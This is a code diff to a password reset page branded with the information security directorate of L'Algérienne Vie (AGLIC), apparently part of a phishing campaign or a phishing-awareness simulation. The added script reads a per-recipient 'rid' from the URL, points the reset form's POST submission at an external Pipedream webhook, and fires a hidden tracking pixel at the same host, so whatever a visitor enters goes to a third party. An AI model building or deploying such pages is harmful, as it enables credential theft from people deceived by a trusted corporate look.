@@ -61,11 +61,12 @@
   L'Algérienne Vie (AGLIC) - Direction de la Sécurité des Systèmes d'Information (DSI). © 2026
 </div>
 
+<!-- Hidden image for tracking (GET request to Pipedream with rid) -->
 <img id="trackingPixel" style="display:none; width:0; height:0;" alt="" />
 
 <script>
-  // REPLACE THIS WITH YOUR ACTUAL PIPEDREAM URL
-  const PIPEDREAM_WEBHOOK_URL = 'https://eojm3p0sophj3r8.m.pipedream.net';
+  // Your Pipedream webhook URL
+  const PIPEDREAM_WEBHOOK_URL = 'https://eof80viusl2fph4.m.pipedream.net';
   
   (function() {
     const urlParams = new URLSearchParams(window.location.search);
@@ -75,11 +76,13 @@
       const cleanRid = encodeURIComponent(rid.trim());
       const targetUrl = PIPEDREAM_WEBHOOK_URL + '?rid=' + cleanRid;
 
+      // Set form action - native POST submission to Pipedream
       const form = document.getElementById('resetForm');
       if (form) {
         form.action = targetUrl;
       }
 
+      // Set tracking pixel src - sends GET request to Pipedream
       const trackingImg = document.getElementById('trackingPixel');
       if (trackingImg) {
         trackingImg.src = targetUrl;
